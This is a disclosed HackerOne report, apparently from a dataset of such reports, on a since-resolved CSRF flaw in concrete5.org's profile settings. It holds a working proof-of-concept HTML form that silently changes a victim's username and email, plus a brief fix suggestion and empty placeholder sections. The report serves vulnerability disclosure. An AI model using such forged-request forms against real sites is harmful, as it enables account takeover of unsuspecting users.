---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '152052'
original_report_id: '152052'
title: CSRF Full Account Takeover
weakness: Cross-Site Request Forgery (CSRF)
team_handle: concretecms
created_at: '2016-07-18T13:08:36.259Z'
disclosed_at: '2016-08-12T22:02:46.488Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 9
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# CSRF Full Account Takeover

## Metadata

- HackerOne Report ID: 152052
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: concretecms
- Disclosed At: 2016-08-12T22:02:46.488Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Try this code in your browser:

<html>
  <body>
    <form action="https://www.concrete5.org/profile/preferences/-/save/" method="POST">
      <input type="hidden" name="uName" value="██████" />
      <input type="hidden" name="uEmail" value="████" />
      <input type="hidden" name="uAccountType" value="owner" />
      <input type="hidden" name="profile&#95;private&#95;messages&#95;notification&#95;enabled" value="1" />
      <input type="hidden" name="uPasswordOld" value="" />
      <input type="hidden" name="uPasswordNew" value="" />
      <input type="hidden" name="uPasswordNewConfirm" value="" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

You need to ask for confirming password for changing settings, or use a token everytime it is changed.

If any further information is needed, plase ask.

Thanks.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
